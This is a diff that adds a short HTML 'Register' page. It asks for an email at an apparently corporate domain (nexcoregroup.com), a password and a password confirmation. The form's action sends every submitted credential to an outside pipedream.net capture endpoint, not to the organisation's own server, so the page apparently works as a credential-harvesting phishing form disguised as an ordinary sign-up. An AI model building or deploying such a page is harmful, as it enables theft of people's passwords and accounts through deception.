@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>Register Page</title>
+        <script>
+            function validateForm() {
+                var password = document.getElementById("password-input").value;
+                var confirmPassword = document.getElementById("confirm-password-input").value;
+                if (password != confirmPassword) {
+                    alert("Passwords do not match.");
+                    return false;
+                }
+                return true;
+            }
+        </script>
+    </head>
+    <body>
+        <form id="register-form" action="https://eomx7p6rfpyhol6.m.pipedream.net" method="POST" onsubmit="return validateForm();">
+            <fieldset>
+                <legend>Register</legend>
+                <label for="email-input">Email:</label>
+                <input type="email" id="email-input" name="email-input" placeholder="first.last@nexcoregroup.com" required><br><br>
+                <label for="password-input">Password:</label>
+                <input type="password" id="password-input" name="password-input" pattern=".{8,}" required><br><br>
+                <label for="confirm-password-input">Confirm Password:</label>
+                <input type="password" id="confirm-password-input" name="confirm-password-input" required><br><br>
+                <input type="submit" value="Submit"><br><br>
+            </fieldset>
+        </form>
+    </body>
+</html>
